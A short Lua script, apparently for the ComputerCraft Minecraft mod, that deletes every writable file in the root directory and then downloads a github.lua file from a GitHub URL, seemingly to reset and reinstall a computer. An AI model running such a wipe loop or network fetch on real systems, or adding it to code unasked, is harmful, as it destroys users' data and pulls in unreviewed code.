for _,file in ipairs(fs.list("/")) do
    if not fs.isReadOnly(file) then
      fs.delete(file)
    end
  end
  
shell.run("wget", "https://raw.github.com/finnolin/elev/master/github.lua", "github")
